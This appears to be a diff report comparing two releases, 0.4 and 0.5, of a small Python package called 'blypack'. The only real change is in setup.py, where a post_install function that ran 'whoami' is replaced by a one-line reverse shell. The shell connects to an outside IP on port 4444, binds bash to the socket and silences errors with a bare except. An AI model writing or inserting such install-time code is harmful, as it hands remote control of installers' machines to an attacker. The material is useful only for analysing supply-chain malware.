# Comparing `tmp/blypack-0.4.tar.gz` & `tmp/blypack-0.5.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "blypack-0.4.tar", last modified: Mon May 20 13:02:04 2024, max compression
+gzip compressed data, was "blypack-0.5.tar", last modified: Mon May 20 13:02:52 2024, max compression
```

## Comparing `blypack-0.4.tar` & `blypack-0.5.tar`

### file list

```diff
@@ -1,11 +1,11 @@
-drwxrwxr-x   0 blorente  (1001) blorente  (1001)        0 2024-05-20 13:02:04.062722 blypack-0.4/
--rw-r--r--   0 blorente  (1001) blorente  (1001)       49 2024-05-20 13:02:04.062722 blypack-0.4/PKG-INFO
-drwxrwxr-x   0 blorente  (1001) blorente  (1001)        0 2024-05-20 13:02:04.062722 blypack-0.4/blypack/
--rw-rw-r--   0 blorente  (1001) blorente  (1001)       25 2024-05-20 12:34:52.000000 blypack-0.4/blypack/__init__.py
-drwxrwxr-x   0 blorente  (1001) blorente  (1001)        0 2024-05-20 13:02:04.062722 blypack-0.4/blypack.egg-info/
--rw-r--r--   0 blorente  (1001) blorente  (1001)       49 2024-05-20 13:02:03.000000 blypack-0.4/blypack.egg-info/PKG-INFO
--rw-rw-r--   0 blorente  (1001) blorente  (1001)      152 2024-05-20 13:02:04.000000 blypack-0.4/blypack.egg-info/SOURCES.txt
--rw-rw-r--   0 blorente  (1001) blorente  (1001)        1 2024-05-20 13:02:03.000000 blypack-0.4/blypack.egg-info/dependency_links.txt
--rw-rw-r--   0 blorente  (1001) blorente  (1001)        8 2024-05-20 13:02:03.000000 blypack-0.4/blypack.egg-info/top_level.txt
--rw-rw-r--   0 blorente  (1001) blorente  (1001)       38 2024-05-20 13:02:04.062722 blypack-0.4/setup.cfg
--rw-rw-r--   0 blorente  (1001) blorente  (1001)      681 2024-05-20 13:01:13.000000 blypack-0.4/setup.py
+drwxrwxr-x   0 blorente  (1001) blorente  (1001)        0 2024-05-20 13:02:52.739758 blypack-0.5/
+-rw-r--r--   0 blorente  (1001) blorente  (1001)       49 2024-05-20 13:02:52.739758 blypack-0.5/PKG-INFO
+drwxrwxr-x   0 blorente  (1001) blorente  (1001)        0 2024-05-20 13:02:52.739758 blypack-0.5/blypack/
+-rw-rw-r--   0 blorente  (1001) blorente  (1001)       25 2024-05-20 12:34:52.000000 blypack-0.5/blypack/__init__.py
+drwxrwxr-x   0 blorente  (1001) blorente  (1001)        0 2024-05-20 13:02:52.739758 blypack-0.5/blypack.egg-info/
+-rw-r--r--   0 blorente  (1001) blorente  (1001)       49 2024-05-20 13:02:52.000000 blypack-0.5/blypack.egg-info/PKG-INFO
+-rw-rw-r--   0 blorente  (1001) blorente  (1001)      152 2024-05-20 13:02:52.000000 blypack-0.5/blypack.egg-info/SOURCES.txt
+-rw-rw-r--   0 blorente  (1001) blorente  (1001)        1 2024-05-20 13:02:52.000000 blypack-0.5/blypack.egg-info/dependency_links.txt
+-rw-rw-r--   0 blorente  (1001) blorente  (1001)        8 2024-05-20 13:02:52.000000 blypack-0.5/blypack.egg-info/top_level.txt
+-rw-rw-r--   0 blorente  (1001) blorente  (1001)       38 2024-05-20 13:02:52.739758 blypack-0.5/setup.cfg
+-rw-rw-r--   0 blorente  (1001) blorente  (1001)      893 2024-05-20 13:02:48.000000 blypack-0.5/setup.py
```

### Comparing `blypack-0.4/setup.py` & `blypack-0.5/setup.py`

 * *Files 16% similar despite different names*

```diff
@@ -1,16 +1,18 @@
 import os
 from setuptools import setup
 
 def post_install():
-	os.system('whoami')
-
+	try:
+		import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("81.46.246.181",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")
+	except:
+		pass
 setup(
     name='blypack',
-    version='0.4',
+    version='0.5',
     packages=['blypack'],
     install_requires=[
         # lista de dependencias
     ],
     # Ejecuta post_install después de la instalación
     # No se necesita 'cmdclass' para esto.
     # No intentes ejecutar 'install.run()', solo llama a post_install() directamente.
```

